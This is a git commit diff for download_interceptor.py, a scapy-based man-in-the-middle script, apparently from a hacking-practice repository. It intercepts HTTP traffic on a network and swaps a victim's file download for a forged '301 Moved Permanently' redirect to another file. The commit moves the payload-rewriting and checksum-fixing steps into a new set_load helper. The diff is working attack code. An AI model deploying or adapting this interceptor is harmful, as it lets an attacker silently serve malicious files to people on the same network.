64c4f4df7355f4116c24adac6f6e56cf195c6844
Andreas W <31095453+Sir-Casm@users.noreply.github.com>
2022-08-26 12:47:30 +0200

    refactoring: added new function to set the modified payload
    + moved setting the payload to new function

--- download_interceptor.py
+++ download_interceptor.py
@@ -8,6 +8,14 @@ import scapy.all as scapy
 ack_list = []
 
 
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[inet.IP].len
+    del packet[inet.IP].chksum
+    del packet[inet.TCP].chksum
+    return packet
+
+
 def process_packet(packet):
     scapy_packet = inet.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
@@ -19,13 +27,9 @@ def process_packet(packet):
             if scapy_packet[inet.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[inet.TCP].seq)
                 print("Replacing file.")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://dlcdn.apache.org/httpd/httpd-2.4.54.tar.bz2\n\n"
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://dlcdn.apache.org/httpd/httpd-2.4.54.tar.bz2\n\n")
 
-                del scapy_packet[inet.IP].len
-                del scapy_packet[inet.IP].chksum
-                del scapy_packet[inet.TCP].chksum
-
-                packet.set_payload(bytes(scapy_packet))
+                packet.set_payload(bytes(modified_packet))
 
     packet.accept()
 
